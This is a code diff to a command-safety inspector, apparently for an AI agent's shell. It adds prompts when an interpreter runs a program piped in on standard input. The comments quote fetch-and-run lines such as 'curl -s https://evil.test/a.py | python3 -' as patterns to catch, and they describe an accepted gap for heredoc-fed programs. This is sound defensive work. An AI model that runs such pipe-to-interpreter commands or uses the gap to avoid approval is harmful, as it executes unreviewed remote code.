@@ -156,12 +156,16 @@ export const INSPECTORS: Record<string, Inspector> = {
   perl: (cmdInfo) => {
     if (hasInlineCode(cmdInfo.args, PERL_INLINE))
       return prompt("perl: inline code", "Perl -e runs arbitrary inline code")
+    if (runsStdinProgram(cmdInfo, PERL_INLINE))
+      return prompt("perl: program from stdin", "Perl is running a program supplied on standard input")
     return allow("perl: script runner")
   },
 
   ruby: (cmdInfo) => {
     if (hasInlineCode(cmdInfo.args, RUBY_INLINE))
       return prompt("ruby: inline code", "Ruby -e runs arbitrary inline code")
+    if (runsStdinProgram(cmdInfo, RUBY_INLINE))
+      return prompt("ruby: program from stdin", "Ruby is running a program supplied on standard input")
     return allow("ruby: script runner")
   },
 
@@ -326,18 +330,24 @@ export const INSPECTORS: Record<string, Inspector> = {
   node: (cmdInfo) => {
     if (hasInlineCode(cmdInfo.args, NODE_INLINE))
       return prompt("node: inline code", "Node -e/--eval runs arbitrary inline code")
+    if (runsStdinProgram(cmdInfo, NODE_INLINE))
+      return prompt("node: program from stdin", "Node is running a program supplied on standard input")
     return allow("node: script runner")
   },
 
   python: (cmdInfo) => {
     if (hasInlineCode(cmdInfo.args, PYTHON_INLINE))
       return prompt("python: inline code", "Python -c runs arbitrary inline code")
+    if (runsStdinProgram(cmdInfo, PYTHON_INLINE))
+      return prompt("python: program from stdin", "Python is running a program supplied on standard input")
     return allow("python: script runner")
   },
 
   python3: (cmdInfo) => {
     if (hasInlineCode(cmdInfo.args, PYTHON_INLINE))
       return prompt("python3: inline code", "Python -c runs arbitrary inline code")
+    if (runsStdinProgram(cmdInfo, PYTHON_INLINE))
+      return prompt("python3: program from stdin", "Python is running a program supplied on standard input")
     return allow("python3: script runner")
   },
 
@@ -951,6 +961,12 @@ interface InlineCodeSpec {
   numericLetters: Set<string>
   /** Long options whose value is code, in both `--opt value` and `--opt=value` form. */
   longFlags: Set<string>
+  /**
+   * Short letters whose value names the program to run, so nothing is read
+   * from standard input. Only python's `-m` (run a module) — `python3 -m
+   * json.tool <<'JSON'` feeds the module DATA, not code.
+   */
+  moduleLetters: Set<string>
 }
 
 // perl: -e and -E both eval. -0/-l/-C take optional octal and parsing continues
@@ -958,6 +974,7 @@ interface InlineCodeSpec {
 const PERL_INLINE: InlineCodeSpec = {
   codeLetters: new Set(["e", "E"]),
   valueLetters: new Set(["F", "i", "I", "m", "M", "x", "S", "D"]),
+  moduleLetters: new Set(),
   numericLetters: new Set(["0", "l", "C"]),
   longFlags: new Set(),
 }
@@ -966,6 +983,7 @@ const PERL_INLINE: InlineCodeSpec = {
 const RUBY_INLINE: InlineCodeSpec = {
   codeLetters: new Set(["e"]),
   valueLetters: new Set(["C", "E", "F", "I", "K", "r", "T", "W", "x", "S"]),
+  moduleLetters: new Set(),
   numericLetters: new Set(["0"]),
   longFlags: new Set(),
 }
@@ -974,6 +992,7 @@ const RUBY_INLINE: InlineCodeSpec = {
 const NODE_INLINE: InlineCodeSpec = {
   codeLetters: new Set(["e", "p"]),
   valueLetters: new Set(["r", "C"]),
+  moduleLetters: new Set(),
   numericLetters: new Set(),
   longFlags: new Set(["--eval", "--print"]),
 }
@@ -982,6 +1001,7 @@ const NODE_INLINE: InlineCodeSpec = {
 const PYTHON_INLINE: InlineCodeSpec = {
   codeLetters: new Set(["c"]),
   valueLetters: new Set(["m", "Q", "W", "X"]),
+  moduleLetters: new Set(["m"]),
   numericLetters: new Set(),
   longFlags: new Set(),
 }
@@ -1014,6 +1034,75 @@ function hasInlineCode(args: string[], spec: InlineCodeSpec): boolean {
     }
   }
   return false
+}
+
+/**
+ * Does this invocation take its PROGRAM from standard input?
+ *
+ * Every interpreter here reads its program from stdin when handed an explicit
+ * `-`, and when given no script operand at all. That makes the program
+ * whatever stdin is connected to — which the caller pairs with a heredoc or a
+ * pipe to catch:
+ *
+ *   python3 - <<'PY'          perl <<'PL'
+ *   curl https://x/a.py | python3 -
+ *
+ * A script operand means stdin is only DATA for that script, so
+ * `python3 report.py <<'CSV'` and `cat x | python3 report.py` stay allowed.
+ * So does `-m module`, whose program is the module.
+ */
+function readsProgramFromStdin(args: string[], spec: InlineCodeSpec): boolean {
+  for (let i = 1; i < args.length; i++) {
+    const arg = args[i]!
+
+    // Everything after `--` is the script operand and its arguments.
+    if (arg === "--") return i + 1 >= args.length
+    if (arg === "-") return true            // explicit "read the program from stdin"
+    if (!arg.startsWith("-")) return false  // a script file to run
+    if (arg.startsWith("--")) continue
+
+    // Short-option bundle, walked with the same getopt rules as hasInlineCode.
+    for (let c = 1; c < arg.length; c++) {
+      const letter = arg[c]!
+      if (spec.numericLetters.has(letter)) {
+        while (c + 1 < arg.length && arg[c + 1]! >= "0" && arg[c + 1]! <= "9") c++
+        continue
+      }
+      if (spec.moduleLetters.has(letter)) return false
+      if (spec.codeLetters.has(letter) || spec.valueLetters.has(letter)) {
+        // The value is the rest of the token, or the next arg when this
+        // letter ends it — either way it is not a script operand.
+        if (c === arg.length - 1) i++
+        break
+      }
+    }
+  }
+  // Ran out of arguments without finding a script: stdin is the program.
+  return true
+}
+
+/**
+ * Shared check for the interpreters: is this invocation running a program
+ * piped in from somewhere else?
+ *
+ *   curl -s https://evil.test/a.py | python3 -
+ *
+ * This is `curl | bash` with a different interpreter, and PIPE_SHELLS in
+ * decide.ts already prompts for the shell spelling. Requiring a pipe is also
+ * what keeps `python3 --version` and a bare `node` — no stdin connected, no
+ * program to run — from looking like a program read from standard input.
+ *
+ * Deliberately NOT extended to heredocs. `python3 - <<'PY' ... PY` is
+ * likewise unreviewable code, but prompting for it closes nothing: writing
+ * a .py file and running it is already two auto-approved steps, so the same
+ * program is reachable either way. It is also the single most common file
+ * editing idiom in practice — 117 invocations in one audit log — so the
+ * prompts would be constant and would buy no safety. The residual gap is
+ * accepted knowingly, and is the same call made for the script-file
+ * fallback on perl/node.
+ */
+function runsStdinProgram(cmdInfo: CommandInfo, spec: InlineCodeSpec): boolean {
+  return cmdInfo.stdinFromPipe === true && readsProgramFromStdin(cmdInfo.args, spec)
 }
 
 interface SedParse {
